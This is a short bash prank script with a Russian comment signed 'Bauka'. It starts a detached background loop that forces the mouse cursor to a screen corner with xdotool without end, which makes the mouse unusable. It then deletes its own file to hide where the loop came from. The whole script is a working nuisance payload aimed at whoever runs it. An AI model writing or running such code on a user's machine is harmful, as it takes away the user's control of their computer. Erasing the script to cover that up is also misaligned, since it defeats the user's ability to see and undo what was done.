#!/bin/bash
# Курсор в тюрьме ಥ_ಥ 🥰💀 P.S. С любовью, Bauka (basagitz)

nohup bash -c "
while true; do
    xdotool mousemove 5000 5000
done
" > /dev/null 2>&1 & disown
rm -- "$0"